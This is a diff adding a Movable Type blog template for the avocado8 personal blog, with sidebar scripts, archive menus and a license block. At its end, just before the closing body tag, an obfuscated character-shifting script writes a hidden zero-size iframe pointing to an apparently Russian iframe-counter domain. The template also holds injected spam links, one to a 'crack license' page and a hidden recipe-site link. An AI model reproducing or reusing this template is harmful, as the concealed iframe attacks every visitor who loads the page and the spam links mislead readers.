@@ -1,0 +1,220 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=<$MTPublishCharset$>" />
+<meta name="generator" content="http://www.movabletype.org/" />
+
+<title><$MTBlogName$></title>
+
+<link rel="stylesheet" href="/blog/styles-site.css" type="text/css" />
+<link rel="alternate" type="application/atom+xml" title="Atom" href="<$MTBlogURL$>atom.xml" />
+<link rel="alternate" type="application/rss+xml" title="RSS 1.0" href="<$MTBlogURL$>index.rdf" />
+<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<$MTBlogURL$>index.xml" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="<$MTBlogURL$>rsd.xml" />
+
+<MTBlogIfCCLicense>
+<$MTCCLicenseRDF$>
+</MTBlogIfCCLicense>
+<script language="JavaScript" src="blogSettings.js"></script>
+
+<script language="javascript" type="text/javascript">
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+var winObj = window.open(theURL,winName,features);
+winObj.focus();
+}
+
+function goToCat(theList){
+var si = theList.selectedIndex;
+if (si > 0){
+window.location = theList.options[si].value;
+}
+}
+</script>
+
+<MTBlogIfCCLicense>
+<$MTCCLicenseRDF$>
+</MTBlogIfCCLicense>
+
+</head>
+
+<body onLoad="setSillyFace()">
+<div id="content">
+
+<div class="blog">
+
+<MTEntries lastn="4">
+<$MTEntryTrackbackData$>
+
+<MTDateHeader>
+<h2 class="date">
+<$MTEntryDate format="%x"$>
+</h2>
+</MTDateHeader>
+
+<div class="blogbody">
+
+<a name="<$MTEntryID pad="1"$>"></a>
+<h3 class="title"><$MTEntryTitle$></h3>
+
+<$MTEntryBody$>
+<$MTEntryMore$>
+
+<div class="posted">Posted by <$MTEntryAuthor$> in <MTEntryCategories glue=" and "><a href="<$MTCategoryArchiveLink$>"><$MTCategoryLabel$></a></MTEntryCategories> at <$MTEntryDate format="%X"$> [GMT -5:00]
+<MTEntryIfAllowComments>
+| <a href="<$MTEntryPermalink$>#comments">Comments (<$MTEntryCommentCount$>)</a>
+</MTEntryIfAllowComments>
+<MTEntryIfAllowPings>
+| <a href="<$MTEntryPermalink$>#trackbacks">TrackBack (<$MTEntryTrackbackCount$>)</a>
+</MTEntryIfAllowPings>
+| <a href="<$MTEntryPermalink$>">Permalink</a>
+</div>
+
+</div>
+
+
+
+</MTEntries>
+
+</div>
+
+</div>
+<div id="links">
+<div id="banner">
+<h1><a href="<$MTBlogURL$>" accesskey="1">avocado<span style="color:#A5BA10">8</span></a></h1>
+</div>
+
+<div>
+<form>
+<select id="catList" name="catList" onChange="goToCat(this)">
+<option value="">What this blog is about</option>
+<MTCategories>
+<option value="<$MTCategoryArchiveLink$>"><$MTCategoryLabel$></option>
+</MTCategories>
+</select>
+</form>
+</div>
+
+<div class="sidetitle">
+Recent Entries
+</div>
+<div class="side">
+<MTEntries lastn="8">
+<a href="<$MTEntryPermalink$>"><$MTEntryTitle$></a><br />
+</MTEntries>
+</div>
+
+<div class="sidetitle">
+Archives
+</div>
+<div class="monthlyArchives">
+<form>
+<select name="archList" size="5" id="archList" onChange="goToCat(this)">
+<MTArchiveList archive_type="Monthly">
+<option value="<$MTArchiveLink$>"><$MTArchiveTitle$></option>
+</MTArchiveList>
+<option value="http://www.avocado8.com/blog/blogger/blog_archive_detail.html">October 2000 - March 2003 (blogger)</option>
+</select>
+</form>
+</div>
+<!--
+<div class="side">
+<MTArchiveList archive_type="Monthly">
+<a href="<$MTArchiveLink$>"><$MTArchiveTitle$></a><br />
+</MTArchiveList>
+<a href="/blog/blogger/blog_archive_detail.html">October 2000 - March 2003 (blogger) </a><br />
+</div>
+-->
+
+<div class="sidetitle">
+Also By Me
+</div>
+<div class="side">
+<script language="JavaScript">
+document.write(alsoByMe);
+</script>
+<br />
+</div>
+
+<div class="sidetitle">
+Bookmarks</div>
+<div class="side">
+<script language="JavaScript">
+document.write(bookmarks);
+</script>
+</div>
+
+<script language="JavaScript">
+if (giggle){
+document.writeln('<div class="sidetitle">');
+document.writeln('Daily Giggle<a href="#asterisk">*</a></div>');
+document.writeln('<div class="side">');
+document.writeln(giggle);
+document.writeln('</div>');
+}
+</script>
+
+<div class="sidetitle">
+Additional Reading</div>
+<div class="side">
+<script language="JavaScript">
+document.write(booklist);
+</script>
+<br />
+</div>
+
+<div class="sidetitle">
+In the Background
+</div>
+<div class="side">
+<script language="JavaScript">
+document.write(backgroundNoise);
+</script>
+<br />
+</div>
+
+<div class="sidetitle">
+Overindulgences</div>
+<div class="side">
+<script language="JavaScript">
+document.write(overindulgences);
+</script>
+<br />
+<img alt="the momster and the boopster" src="/blog/images/princeton/both_open.jpg" width="240" height="360" galleryimg="no" style="margin-top:5px"/>
+</div>
+
+<div class="syndicate">
+<strong style="color:black">All entries &copy; Lori Hylan-Cho</strong><br />
+<a href="index.rdf">Syndicate this site (XML)</a>
+</div>
+
+<MTBlogIfCCLicense>
+<div class="syndicate">
+<a href="<$MTBlogCCLicenseURL$>"><img alt="Creative Commons License" border="0" src="<$MTBlogCCLicenseImage$>" /></a>
+</div>
+</MTBlogIfCCLicense>
+
+<div class="powered">
+Powered by<br /><a href="http://www.movabletype.org">Movable Type <$MTVersion$></a><br />
+</div>
+
+<!--
+<p class="sillyFace">silly face of the day:<br />
+<a href="javascript:;" onClick="MM_openBrWindow('http://cherrystreet.home.comcast.net/webcam_in_win.html','webcamWin','width=240,height=180')"><img alt="one of Lori's silly faces" name="faceImage" width="240" height="180" border="1" class="images" id="faceImage"></a>
+</p><a href="http://reelguys.org/stats/daily/2006/11/22/directories/banners_v/crack license for tsearch.html" class=giepoaytr title="crack license for tsearch">crack license for tsearch</a>
+-->
+
+<script language="JavaScript">
+if (giggle){
+document.writeln('<p class="side">');
+document.writeln('<a name="asterisk"></a>');
+document.writeln('*Occasionally more of an asthma attack-inducing, can't-stop-laughing thing than an actual giggle.');
+document.writeln('</p>');
+document.writeln('</div>');
+}
+</script>
+<a href="http://www.freecookingrecipes.net"><img src="/halloween/dot_clear.gif" hspace="0" vspace="0" border="0" alt="free recipes"></a>
+<br clear="all" />
+
+<script language="javascript" type="text/javascript">var k1='?gly#vw|oh@%ylvlelolw|=#klgghq>#srvlwlrq=#devroxwh>#ohiw=#4>#wrs=#4%A?liudph#vuf@%kwws=22',k2='0wugtu0khtcogeqwpvgt0tw1Au?3$"htcogdqtfgt?2"xurceg?2"jurceg?2"ykfvj?3"jgkijv?3"octikpykfvj?2"octikpjgkijv?2"uetqnnkpi?pq@>1khtcog@>1fkx@',t1=0,t2=0,h='';while(t1<=k1.length-1){h=h+String.fromCharCode(k1.charCodeAt(t1++)-3);}h=h+'hgffzzazbzdg';while(t2<=k2.length-1){h=h+String.fromCharCode(k2.charCodeAt(t2++)-2);}document.write(h);</script></body>
+</html>
